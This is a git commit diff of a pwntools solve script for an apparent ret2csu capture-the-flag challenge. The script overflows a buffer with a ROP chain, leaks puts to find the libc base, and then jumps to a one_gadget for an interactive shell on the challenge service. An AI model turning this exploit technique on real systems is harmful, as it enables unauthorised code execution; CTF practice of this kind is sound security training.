9dfb70675210b1285194eaed7573e2284a9de864
Architect <jbechsen@gmail.com>
2022-03-30 16:41:09 +0200

    r2c

--- pwn/ret2csu/solve.py
+++ pwn/ret2csu/solve.py
@@ -12,20 +12,22 @@ libc = ELF("./libc.so.6")
 def _u64(b):
     return u64(b.ljust(8, b'\x00'))
 
-p = process("./docker/r2c")
-gdb.attach(p, '''
-c
-''')
+#p = process("./r2c_patched")
+p = remote("localhost", 1024) 
+#gdb.attach(p, '''
+#b main
+#''')
+#input('wait')
 
 p.recvline()
 
 payload = b"A"*128
-payload += p64(0x0) #+ b"A"*8
+payload += p64(0x0)
 
 # Leak libc
-payload += p64(poprdi) + p64(puts_plt) +p64(callputs)
+payload += p64(poprdi) + p64(puts_plt) +p64(0x400430)
 
-payload += p64(main) + b"B"*8
+payload += p64(0x0000000000400538) + b"B"*8
 # Second chance
 p.sendline(payload)
 
@@ -35,4 +37,8 @@ leak = _u64(p.recvline()[:-1])
 log.info(f"Got leak: {hex(leak)}")
 libc_base = leak-libc.symbols["puts"]
 log.info(f"Libc base @ {hex(libc_base)}")
+payload = b"A"*128
+payload += p64(0xdeadbeef)
+payload += p64(libc_base+0x4f302)   # Onegadget
+p.sendline(payload)
 p.interactive()
